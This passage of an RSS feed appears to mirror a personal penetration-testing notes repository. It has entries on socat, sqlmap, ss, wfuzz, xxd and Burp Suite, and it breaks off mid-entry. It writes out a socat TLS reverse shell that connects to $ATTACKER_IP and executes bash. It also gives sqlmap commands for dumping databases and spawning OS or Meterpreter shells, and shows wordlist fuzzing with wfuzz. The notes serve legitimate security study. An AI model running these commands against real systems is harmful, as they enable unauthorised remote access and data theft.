&lt;span id=&quot;cb4-5&quot;&gt;&lt;a href=&quot;#cb4-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-6&quot;&gt;&lt;a href=&quot;#cb4-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;OPENSSL-LISTEN&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt;,cert=&lt;span class=&quot;va&quot;&gt;$PEM_FILE&lt;/span&gt;,verify=0 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-7&quot;&gt;&lt;a href=&quot;#cb4-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;FILE&lt;/span&gt;:&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;`&lt;/span&gt;,raw,echo=0&lt;/span&gt;
&lt;span id=&quot;cb4-8&quot;&gt;&lt;a href=&quot;#cb4-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-9&quot;&gt;&lt;a href=&quot;#cb4-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Target: Connect the listener on the attacker to an&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-10&quot;&gt;&lt;a href=&quot;#cb4-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# interactive login bash shell.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-11&quot;&gt;&lt;a href=&quot;#cb4-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-12&quot;&gt;&lt;a href=&quot;#cb4-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     pty    - allocate a PTTY&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-13&quot;&gt;&lt;a href=&quot;#cb4-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     stderr - redirect STDERR to the attacker&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-14&quot;&gt;&lt;a href=&quot;#cb4-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     sigint - pass signals (Ctrl+C) through&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-15&quot;&gt;&lt;a href=&quot;#cb4-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     setsid - use a new session&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-16&quot;&gt;&lt;a href=&quot;#cb4-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#     sane   - use a variety of tweaks to &amp;quot;normalize&amp;quot; the&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-17&quot;&gt;&lt;a href=&quot;#cb4-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#              terminal&amp;#39;s environment&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-18&quot;&gt;&lt;a href=&quot;#cb4-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-19&quot;&gt;&lt;a href=&quot;#cb4-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;socat&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-20&quot;&gt;&lt;a href=&quot;#cb4-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;OPENSSL&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt;,verify=0 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-21&quot;&gt;&lt;a href=&quot;#cb4-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;EXEC&lt;/span&gt;:&lt;span class=&quot;st&quot;&gt;&amp;quot;/bin/bash -li&amp;quot;&lt;/span&gt;,pty,stderr,sigint,setsid,sane&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The reverse shell will not pick up on your terminal size, so you'll need to manually specify it using &lt;code&gt;stty rows&lt;/code&gt; and &lt;code&gt;stty cols&lt;/code&gt;.&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22socat%22.md</guid>
		</item>
		<item>
			<title>Using "sqlmap"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22sqlmap%22.md</link>
			<description>&lt;p&gt;Used to automate SQLi attacks (and apparently banned on the OSCP because it makes things too easy).&lt;/p&gt;&lt;p&gt;Useful flags:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-u URL&lt;/code&gt;/&lt;code&gt;--url=URL&lt;/code&gt; - process URL (this &lt;em&gt;must&lt;/em&gt; include the query parameters &lt;em&gt;or&lt;/em&gt; you must specify POST parameters using &lt;code&gt;--data&lt;/code&gt;)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;/ - which URL parameter(s) (variables) to test&lt;/li&gt;&lt;li&gt;&lt;code&gt;--dbms=DB_TYPE&lt;/code&gt; - only use injections for a given type of backend database (MySQL, PostgreSQL, etc.)&lt;/li&gt;&lt;li&gt;&lt;code&gt;--dbs&lt;/code&gt; - enumerate DBs&lt;/li&gt;&lt;li&gt;&lt;code&gt;-D&lt;/code&gt;/&lt;code&gt;-T&lt;/code&gt;/&lt;code&gt;-C&lt;/code&gt; - dump a specific database/table/column&lt;/li&gt;&lt;li&gt;&lt;code&gt;--dump&lt;/code&gt;/&lt;code&gt;--dump-all&lt;/code&gt;/&lt;code&gt;--all&lt;/code&gt; - dump data&lt;/li&gt;&lt;li&gt;&lt;code&gt;--os-shell&lt;/code&gt; - attempt to spawn an interactive shell&lt;/li&gt;&lt;li&gt;&lt;code&gt;--os-pwn&lt;/code&gt; - attempt to spawn a Meterpreter shell or VNC session&lt;/li&gt;&lt;li&gt;&lt;code&gt;--forms&lt;/code&gt; - parse target URL for forms, and use these&lt;/li&gt;&lt;li&gt;&lt;code&gt;--batch&lt;/code&gt; - don't prompt for user input, just use the defaults&lt;/li&gt;&lt;li&gt;&lt;code&gt;--risk&lt;/code&gt; - set the maximum risk level of tests (1 â 3, lowest to highest risk)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;sqlmap&lt;/span&gt; -u http://example.com/test.php?input=foo &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;--dump-all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;sqlmap&lt;/span&gt; -u http://example.com/test.php &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;--data&lt;/span&gt; input=foo --dump-all&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;One handy way to seed a URL is using requests harvested with Burp Suite.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/ccpentesting&quot;&gt;TryHackMe: CC: Pen Testing&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.geeksforgeeks.org/use-sqlmap-test-website-sql-injection-vulnerability/&quot;&gt;How to use SQLMAP to test a website for SQL Injection vulnerability&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/sqlibasics&quot;&gt;TryHackMe: SQL Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./SQL%20Injection.md&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Burp%20Suite.md&quot;&gt;Using Burp Suite&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22sqlmap%22.md</guid>
		</item>
		<item>
			<title>Using "ss"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22ss%22.md</link>
			<description>&lt;p&gt;&quot;Socket statistics&quot; (&lt;code&gt;ss&lt;/code&gt;) is a &lt;code&gt;netstat&lt;/code&gt;-like tool with slightly nicer formatting. Options:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; - Display TCP sockets&lt;/li&gt;&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; - Display UDP sockets&lt;/li&gt;&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; - Display listening sockets (not just established connections)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; - Show the process using the socket (broken?)&lt;/li&gt;&lt;li&gt;&lt;code&gt;-n&lt;/code&gt; - Show raw port numbers (not named services)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;For example, &lt;code&gt;ss -tulpn&lt;/code&gt; will produce a nice list of open ports.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/gamezone&quot;&gt;TryHackMe: Game Zone&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netstat%22.md&quot;&gt;Using &quot;netstat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22ss%22.md</guid>
		</item>
		<item>
			<title>Using "wfuzz"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22wfuzz%22.md</link>
			<description>&lt;p&gt;wfuzz is a URL fuzzer â basically the command-line version of the Burp Suite Intruder (but it's &lt;em&gt;much&lt;/em&gt; faster, which is what one would generally expect from a command-line tool).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;-c&lt;/code&gt; - Use color&lt;/li&gt;&lt;li&gt;&lt;code&gt;-z&lt;/code&gt; - Specify the wordlist that will replace FUZZ in the request&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Basically, the word &quot;FUZZ&quot; in the URL will be replaced by elements of the wordlist specified by &lt;code&gt;-z&lt;/code&gt;. Multiple slots can be specified using &quot;FUZ2Z&quot;, &quot;FUZ3Z&quot;, etc.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;wfuzz&lt;/span&gt; -z file,rockyou.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         &lt;span class=&quot;ex&quot;&gt;https&lt;/span&gt;://example.com/FUZZ/img/secret.webp&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Use &lt;code&gt;wfuzz --help&lt;/code&gt; for a full list of options. The &lt;code&gt;--hc 404&lt;/code&gt; option is particularly useful for hiding pages that return a 404.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/web&quot;&gt;TryHackMe: Web Fundamentals&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Burp%20Suite.md&quot;&gt;Using Burp Suite&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22wfuzz%22.md</guid>
		</item>
		<item>
			<title>Using "xxd"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22xxd%22.md</link>
			<description>&lt;p&gt;The xxd command is actually pretty standard on Linux systems.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Create a hex dump of binary file $BINARY.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xxd&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$BINARY&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$HEXDUMP&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Reconstitute a binary file from a hex dump! Wow!&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xxd&lt;/span&gt; -r &lt;span class=&quot;va&quot;&gt;$HEXDUMP&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$BINARY&lt;/span&gt; &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22xxd%22.md</guid>
		</item>
		<item>
			<title>Using Burp Suite</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Burp%20Suite.md</link>
			<description>&lt;h2 id=&quot;keyboard-shortcuts&quot;&gt;Keyboard Shortcuts&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;Ctrl + Shift + D&lt;/code&gt; - Switch to Dashboard&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + Shift + T&lt;/code&gt; - Switch to Target&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + Shift + P&lt;/code&gt; - Switch to Proxy&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + Shift + I&lt;/code&gt; - Switch to Intruder&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + Shift + R&lt;/code&gt; - Switch to Repeater&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + F&lt;/code&gt; - Forward intercepted request&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + U&lt;/code&gt; - URL encode selected text in Proxy &amp;gt; Intercept&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + R&lt;/code&gt; - Send request from Proxy to Repeater&lt;/li&gt;&lt;li&gt;&lt;code&gt;Ctrl + R&lt;/code&gt; - Send request from Proxy to Intruder&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;the-burp-suite-browser&quot;&gt;The Burp Suite Browser&lt;/h2&gt;&lt;p&gt;I &lt;em&gt;strongly&lt;/em&gt; recommend using the Burp Suite Browser, since it already has proxy and SSL interception set up. Also, it's always best to keep your &quot;hacker&quot; and &quot;normie&quot; tools/identities as separate as possible!&lt;/p&gt;&lt;h3 id=&quot;using-firefox-with-burp-suite&quot;&gt;Using Firefox with Burp Suite&lt;/h3&gt;&lt;p&gt;The Burp Suite browser is compiled as an x86_64 binary, and thus &lt;em&gt;doesn't&lt;/em&gt; work on a Raspberry Pi. As a work-around, Firefox can be used to interact with Burp Suite.&lt;/p&gt;&lt;p&gt;First, make the following changes to Firefox's settings:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Settings &amp;gt; General &amp;gt; Network Settings &amp;gt; Settingsâ¦ &amp;gt; Manual proxy configuration &amp;gt; [set the &quot;HTTP Proxy&quot; to 127.0.0.1:8080 and check &quot;Also use this proxy for HTTPS&quot;]&lt;/li&gt;&lt;li&gt;Settings &amp;gt; Privacy &amp;amp; Security &amp;gt; Browser Privacy &amp;gt; Logins and Passwords &amp;gt; Ask to save logins and passwords for websites &amp;gt; Off&lt;/li&gt;&lt;li&gt;Settings &amp;gt; Privacy &amp;amp; Security &amp;gt; Browser Privacy &amp;gt; History &amp;gt; Use custom settings for history &amp;gt; Always use private browsing mode &amp;gt; On&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Then install the Burp Suite CA certificate:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Start Burp Suite.&lt;/li&gt;&lt;li&gt;Go to &lt;a href=&quot;http://127.0.0.1:8080&quot;&gt;http://127.0.0.1:8080&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;Click on the &quot;CA Certificate&quot; link in the upper right to download Burp Suite's certificate.&lt;/li&gt;&lt;li&gt;Go to Settings &amp;gt; Privacy &amp;amp; Security &amp;gt; Security &amp;gt; Certificates &amp;gt; View Certificatesâ¦&lt;/li&gt;&lt;li&gt;Import the Burp Suite CA certificate and check &quot;Trust this CA to identify websites.&quot;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;It's also possible to use FoxyProxy - set up Burp Suite as a togglable proxy and then import the Burp Suite CA certificate as above. I don't like this option because I think that hacking and normal browsing activities should be kept as separate as possible.&lt;/p&gt;&lt;p&gt;Using Chromium on the Raspberry Pi as the Burp Suite browser might be the best option, as it aligns more with Burp Suite's built-in (x86_64) browser. Unfortunately, Chromium's certificate import functionality appears to be broken on Kali Linux ARM right now.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Use%20a%20Raspberry%20Pi%204B%20as%20an%20iPad%20Pro%20Hacking%20Accessory.md&quot;&gt;Use a Raspberry Pi 4B as an iPad Pro Hacking Accessory&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/&quot;&gt;FoxyProxy Basic&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;mobile-app-testing&quot;&gt;Mobile App Testing&lt;/h3&gt;&lt;p&gt;You can proxy mobile API requests through Burp Suite too.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Configure Burp Suite to listen on all interfaces.&lt;/li&gt;&lt;li&gt;Add your computer as an HTTP proxy to the network interface on the mobile device.&lt;/li&gt;&lt;li&gt;Add the Burp Suite CA using more-or-ess the same process as would be used for Firefox (above).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Be aware that this proxies &lt;em&gt;all&lt;/em&gt; device traffic through Burp Suite.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://portswigger.net/support/configuring-an-ios-device-to-work-with-burp&quot;&gt;Configuring an iOS Device to Work With Burp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://portswigger.net/support/installing-burp-suites-ca-certificate-in-an-ios-device&quot;&gt;Installing Burp's CA Certificate in an iOS Device&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;scoping&quot;&gt;Scoping&lt;/h2&gt;&lt;p&gt;Sites can be added to the project scope under Target &amp;gt; Scope.&lt;/p&gt;&lt;p&gt;You can also add them by right-clicking on a site in Target &amp;gt; Site map. When you do this, you'll be prompted to turn off logging outside of the scope. If you want to change this (or forget to set it), then you can still do so in Logger by clicking on the &quot;Capture filter&quot; bar and then checking the &quot;Capture only in-scope items (Suite scope)&quot;&lt;/p&gt;&lt;p&gt;You can further restrict the Proxy to only intercept in-scope requests under Proxy &amp;gt; Options &amp;gt; Intercept Client Requests by turning on &quot;And URL Is in target scope&quot;.&lt;/p&gt;&lt;h2 id=&quot;issue-definitions&quot;&gt;Issue Definitions&lt;/h2&gt;&lt;p&gt;Target &amp;gt; Issue definitions provides a list of the issues used by the vulnerability scanner built into the paid version of Burp Suite. For the Community Edition (i.e., what comes with Kali Linux), it's basically just a massive (and very useful!) reference.&lt;/p&gt;&lt;h2 id=&quot;intruder-attacks&quot;&gt;Intruder Attacks&lt;/h2&gt;&lt;p&gt;Note that Burp Suite seems to have trouble running attacks with a large list. For example, trying to use the &lt;code&gt;rockyou.txt&lt;/code&gt; data set on my machine silently fails.&lt;/p&gt;&lt;h3 id=&quot;sniper&quot;&gt;Sniper&lt;/h3&gt;&lt;p&gt;Sniper takes a &lt;em&gt;single&lt;/em&gt; word list and inserts each element into each defined position, one element and one position at a time.&lt;/p&gt;&lt;p&gt;For example, assume a three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;amp;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Sniper will produce the following sequence of attempts:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;foo=one&amp;amp;bar=position2&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=two&amp;amp;bar=position2&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=three&amp;amp;bar=position2&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=position1&amp;amp;bar=one&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=position1&amp;amp;bar=two&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=position1&amp;amp;bar=three&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Sniper is most useful when attacking a &lt;em&gt;single&lt;/em&gt; position, however.&lt;/p&gt;&lt;h3 id=&quot;battering-ram&quot;&gt;Battering Ram&lt;/h3&gt;&lt;p&gt;Battering Ram again takes a &lt;em&gt;single&lt;/em&gt; word list, but then inserts the &lt;em&gt;same&lt;/em&gt; payload into &lt;em&gt;every&lt;/em&gt; position on each run.&lt;/p&gt;&lt;p&gt;For example, assume a three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;amp;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Battering Ram will produce the following sequence of attempts:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;foo=one&amp;amp;bar=one&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=two&amp;amp;bar=two&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=three&amp;amp;bar=three&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;It's a little mysterious to me why this attack is useful.&lt;/p&gt;&lt;h3 id=&quot;pitchfork&quot;&gt;Pitchfork&lt;/h3&gt;&lt;p&gt;Pitchfork takes &lt;em&gt;one word list per position&lt;/em&gt;, and then iterates through them in sequence (thus all word lists need to be the same length; if the lists are of different lengths, then Pitchfork will stop upon reaching the end of the &lt;em&gt;shortest&lt;/em&gt; list).&lt;/p&gt;&lt;p&gt;For example, assume one three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, a second three-element word list containing &lt;code&gt;alpha&lt;/code&gt;, &lt;code&gt;beta&lt;/code&gt;, and &lt;code&gt;gamma&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;amp;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Pitchfork will produce the following sequence of attempts:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;foo=one&amp;amp;bar=alpha&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=two&amp;amp;bar=beta&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;foo=three&amp;amp;bar=gamma&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;This is generally the approach that would be used in order to test against a potential list of username/password tuples.&lt;/p&gt;&lt;h3 id=&quot;cluster-bomb&quot;&gt;Cluster Bomb&lt;/h3&gt;&lt;p&gt;Cluster Bomb takes &lt;em&gt;one word list per position&lt;/em&gt;, and then tests every possible combination in sequence.&lt;/p&gt;&lt;p&gt;For example, assume one three-element word list containing &lt;code&gt;one&lt;/code&gt;, &lt;code&gt;two&lt;/code&gt;, and &lt;code&gt;three&lt;/code&gt;, a second three-element word list containing &lt;code&gt;alpha&lt;/code&gt;, &lt;code&gt;beta&lt;/code&gt;, and &lt;code&gt;gamma&lt;/code&gt;, and the body date &lt;code&gt;foo=position1&amp;amp;bar=position2&lt;/code&gt;. Then if &lt;code&gt;position1&lt;/code&gt; and &lt;code&gt;position2&lt;/code&gt; are both defined as positions, Cluster Bomb will produce the following sequence of 